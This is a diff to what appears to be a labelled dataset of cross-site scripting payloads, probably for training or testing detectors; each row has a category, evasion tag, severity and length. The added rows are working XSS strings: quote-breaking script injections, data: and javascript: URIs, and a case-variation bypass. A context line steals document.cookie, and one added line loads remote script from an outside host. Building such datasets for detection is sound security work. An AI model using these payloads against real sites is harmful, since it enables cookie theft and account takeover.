@@ -19014,3 +19014,15 @@ javascript:document.body.onclick=alert(1),dom_sink,none,medium,41
 /path?next=javascript:top[/al/.source+/ert/.source](document.cookie),dom_sink,none,high,68
 <big onpointermove=alert(1) style=display:block>AnonKryptiQuz</big>,tag_injection,none,medium,67
 <font onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55
+"');alert(1)//",script_injection,none,high,13
+"');alert('xss')//",script_injection,none,high,17
+"');confirm(1)//",script_injection,none,medium,15
+"');prompt(1)//",script_injection,none,medium,14
+"1');alert(1)//",script_injection,none,high,14
+"3');alert(document.domain)//",script_injection,none,high,28
+"');alert(String.fromCharCode(88,83,83))//",script_injection,none,high,41
+data:text/javascript,alert(1),js_uri,none,high,29
+data:text/javascript,alert(document.domain),js_uri,none,high,43
+//xss.report/s/payload.js,js_uri,none,high,25
+data:,alert(1)//,js_uri,none,high,16
+Data:text/javascript,alert(1),js_uri,case_variation,high,29
